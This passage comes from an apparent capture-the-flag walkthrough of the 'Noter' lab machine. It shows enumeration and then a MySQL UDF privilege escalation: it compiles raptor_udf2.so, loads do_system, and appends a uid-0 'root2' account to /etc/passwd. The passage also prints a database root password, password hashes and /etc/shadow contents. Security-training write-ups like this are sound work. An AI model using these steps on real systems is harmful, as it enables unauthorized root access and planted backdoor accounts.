<span class="nv">VERSION</span><span class="o">=</span><span class="s2">"20.04.3 LTS (Focal Fossa)"</span>
<span class="nv">ID</span><span class="o">=</span>ubuntu
<span class="nv">ID_LIKE</span><span class="o">=</span>debian
<span class="nv">PRETTY_NAME</span><span class="o">=</span><span class="s2">"Ubuntu 20.04.3 LTS"</span>
<span class="nv">VERSION_ID</span><span class="o">=</span><span class="s2">"20.04"</span>
<span class="nv">HOME_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/"</span>
<span class="nv">SUPPORT_URL</span><span class="o">=</span><span class="s2">"https://help.ubuntu.com/"</span>
<span class="nv">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">"https://bugs.launchpad.net/ubuntu/"</span>
<span class="nv">PRIVACY_POLICY_URL</span><span class="o">=</span><span class="s2">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span>
<span class="nv">VERSION_CODENAME</span><span class="o">=</span>focal
<span class="nv">UBUNTU_CODENAME</span><span class="o">=</span>focal
svc@noter:~<span class="nv">$ </span><span class="nb">cat</span> /etc/issue
Ubuntu 20.04.3 LTS <span class="se">\n</span> <span class="se">\l</span>
</code></pre></div></div>

<p>Enumerated running services:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:~<span class="nv">$ </span>netstat <span class="nt">-polentau</span>
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      101        25450      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      0          26661      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 0.0.0.0:5000            0.0.0.0:<span class="k">*</span>               LISTEN      1001       28777      1265/python3         off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      0          27890      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 10.10.11.160:5000       10.10.14.3:32888        ESTABLISHED 1001       247993     1265/python3         off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:58582         127.0.0.1:3306          ESTABLISHED 0          255615     -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp        0      0 127.0.0.1:3306          127.0.0.1:58582         ESTABLISHED 0          255616     -                    keepalive <span class="o">(</span>1103.05/0/0<span class="o">)</span>
tcp        0      1 10.10.11.160:37594      8.8.8.8:53              SYN_SENT    101        358593     -                    on <span class="o">(</span>7.80/3/0<span class="o">)</span>
tcp        0    187 10.10.11.160:57182      10.10.14.3:10099        ESTABLISHED 1001       247702     31500/bash           on <span class="o">(</span>0.24/0/0<span class="o">)</span>
tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN      0          26471      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      0          26663      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 127.0.0.1:36551         127.0.0.53:53           ESTABLISHED 102        358592     -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>                           101        25449      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
udp        0      0 0.0.0.0:68              0.0.0.0:<span class="k">*</span>                           0          21881      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
</code></pre></div></div>

<p>Enumerated mysql:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:~<span class="nv">$ </span>mysql <span class="nt">-V</span>
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, <span class="k">for </span>debian-linux-gnu <span class="o">(</span>x86_64<span class="o">)</span> using readline 5.2

svc@noter:~<span class="nv">$ </span>mysql
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 2483
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| <span class="nb">test</span>               |
+--------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use <span class="nb">test</span><span class="p">;</span>
Database changed
MariaDB <span class="o">[</span><span class="nb">test</span><span class="o">]&gt;</span> show tables
    -&gt; <span class="p">;</span>
Empty <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[</span><span class="nb">test</span><span class="o">]&gt;</span> <span class="nb">exit
</span>Bye

svc@noter:~<span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span><span class="s2">"DB_user"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"DB_password"</span> <span class="nt">-A</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 2519
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| <span class="nb">test</span>               |
+--------------------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use app<span class="p">;</span>
Database changed
MariaDB <span class="o">[</span>app]&gt; show tables<span class="p">;</span>
+---------------+
| Tables_in_app |
+---------------+
| notes         |
| <span class="nb">users</span>         |
+---------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>

svc@noter:~<span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span><span class="s2">"root"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"Nildogg36"</span> <span class="nt">-A</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 2547
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| mysql              |
| performance_schema |
| <span class="nb">test</span>               |
+--------------------+
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select </span>User,Password from user<span class="p">;</span>
+---------+-------------------------------------------+
| User    | Password                                  |
+---------+-------------------------------------------+
| root    | <span class="k">*</span>937440AD99CBB4A102402708AA43B689818489C8 |
| root    |                                           |
| root    |                                           |
| root    |                                           |
|         |                                           |
|         |                                           |
| DB_user | <span class="k">*</span>52107B0F316DEF5A57F59273C66227AEA58A2671 |
+---------+-------------------------------------------+
7 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
</code></pre></div></div>

<p>Enumerated <strong>/opt</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /opt
total 12
drwxr-xr-x  2 root root 4096 May  2 23:05 <span class="nb">.</span>
drwxr-xr-x 19 root root 4096 May  2 23:05 ..
<span class="nt">-rwxr--r--</span>  1 root root  137 Dec 30 09:41 backup.sh

svc@noter:/opt<span class="nv">$ </span><span class="nb">cat </span>backup.sh
<span class="c">#!/bin/bash</span>
zip <span class="nt">-r</span> <span class="sb">`</span><span class="nb">echo</span> /home/svc/ftp/admin/app_backup_<span class="si">$(</span><span class="nb">date</span> +%s<span class="si">)</span>.zip<span class="sb">`</span> /home/svc/app/web/<span class="k">*</span> <span class="nt">-x</span> /home/svc/app/web/misc/node_modules/<span class="k">**</span><span class="se">\*</span>

svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /usr/bin/zip
<span class="nt">-rwxr-xr-x</span> 1 root root 216256 Apr 21  2017 /usr/bin/zip
</code></pre></div></div>

<p>Enumerated PATH:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:/opt<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /home/svc/.local/bin/
drwxrwxr-x 2 svc svc 4096 May  2 23:05 /home/svc/.local/bin/
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/local/sbin
drwxr-xr-x 2 root root 4096 Aug 24  2021 /usr/local/sbin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/local/bin
drwxr-xr-x 2 root root 4096 May  2 15:02 /usr/local/bin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /sbin
lrwxrwxrwx 1 root root 8 Aug 24  2021 /sbin -&gt; usr/sbin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /bin
lrwxrwxrwx 1 root root 7 Aug 24  2021 /bin -&gt; usr/bin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/sbin
drwxr-xr-x 2 root root 20480 May  2 19:24 /usr/sbin
svc@noter:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ald</span> /usr/bin
drwxr-xr-x 2 root root 36864 May  2 22:49 /usr/bin
</code></pre></div></div>

<h2 id="mysql-4x50-linux---user-defined-function-udf-dynamic-library-2">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)</h2>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/1518">Offensive Securityâ€™s Exploit Database Archive</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc@noter:/dev/shm/exploit<span class="nv">$ </span>nano raptor_udf2.c
svc@noter:/dev/shm/exploit<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-c</span> raptor_udf2.c
svc@noter:/dev/shm/exploit<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
svc@noter:/dev/shm/exploit<span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span><span class="s2">"root"</span> <span class="nt">--password</span><span class="o">=</span><span class="s2">"Nildogg36"</span> <span class="nt">-A</span>
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 3445
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> use mysql<span class="p">;</span>
Database changed
MariaDB <span class="o">[</span>mysql]&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
Query OK, 0 rows affected <span class="o">(</span>0.005 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/dev/shm/exploit/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.002 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; show variables like <span class="s1">'%plugin%'</span><span class="p">;</span>
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
Query OK, 0 rows affected <span class="o">(</span>0.001 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
+-----------+-----+----------------+----------+
| name      | ret | dl             | <span class="nb">type</span>     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | <span class="k">function</span> |
+-----------+-----+----------------+----------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s1">'echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd'</span><span class="o">)</span><span class="p">;</span>
+---------------------------------------------------------------------------------+
| do_system<span class="o">(</span><span class="s1">'echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd'</span><span class="o">)</span> |
+---------------------------------------------------------------------------------+
|                                                                               0 |
+---------------------------------------------------------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>

MariaDB <span class="o">[</span>mysql]&gt; <span class="se">\!</span>sh
ERROR: Usage: <span class="se">\!</span> shell-command
MariaDB <span class="o">[</span>mysql]&gt; <span class="se">\!</span> sh
<span class="nv">$ </span>su root2
Password:
root@noter:/dev/shm/exploit# <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id</span><span class="p">;</span> <span class="nb">cat</span> /root/root.txt<span class="p">;</span> ip a
noter
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
f6cf8b4b2c9af103636f9685571917aa
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    <span class="nb">link</span>/ether 00:50:56:b9:49:2b brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.160/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:492b/64 scope global dynamic mngtmpaddr
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:492b/64 scope <span class="nb">link
       </span>valid_lft forever preferred_lft forever
</code></pre></div></div>

<p><img src="/assets/images/Screenshots/Noter/Untitled%2012.png" alt="Untitled" /></p>

<h1 id="trophy">Trophy</h1>

<p><img src="/assets/images/Screenshots/Noter/Untitled%2013.png" alt="Untitled" /></p>

<p><strong>User.txt</strong></p>

<p>c20d842d8d4ce26f46f247128817290d</p>

<p><strong>Root.txt</strong></p>

<p>f6cf8b4b2c9af103636f9685571917aa</p>

<p><strong>/etc/shadow</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@noter:/dev/shm/exploit# <span class="nb">cat</span> /etc/shadow | <span class="nb">grep</span> <span class="s1">'\$'</span>
root:<span class="nv">$6$09RSjU3jIh</span>/2JW1u<span class="nv">$8jlcYzW5Oyzgh</span>/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::
svc:<span class="nv">$6$gTM</span>.AIsgDue4r5AQ<span class="nv">$wUBfUtg7</span>/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7:::
ftp_admin:<span class="nv">$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf</span>.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::
blue:<span class="nv">$6$pNud9u</span>/1PdD8qPYi<span class="nv">$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO</span>/hIiUQdVTqlxb29.:19114:0:99999:7:::
</code></pre></div></div>

<style>
.share {
  display: block;
  margin-left: auto;
  margin-right: auto;
  text-align: center;
}
</style>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs>
    <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol>
    <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol>
    <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol>
    <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol>
    <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol>
    <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol>
    <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol>
    <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol>
    <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol>
    <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111  C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587  c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol>
    <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol>
    <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562
		C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563
		h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243
		C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982
		c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379
		c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379
		C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416
		c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575
		H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685
		c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38
